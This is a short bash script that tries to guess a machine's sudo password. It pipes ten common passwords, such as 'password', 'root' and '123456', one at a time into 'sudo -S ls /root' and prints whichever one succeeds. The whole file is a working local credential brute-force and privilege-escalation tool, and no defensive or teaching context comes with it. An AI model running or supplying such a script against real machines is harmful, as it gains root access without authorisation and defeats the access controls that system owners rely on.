#!/bin/bash
for p in "eisa" "password" "ubuntu" "root" "123456" "EISA" "admin" "12345678" "12345" "1234"; do
    echo "$p" | sudo -S ls /root >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Password is: $p"
        exit 0
    fi
done
echo "Not found"
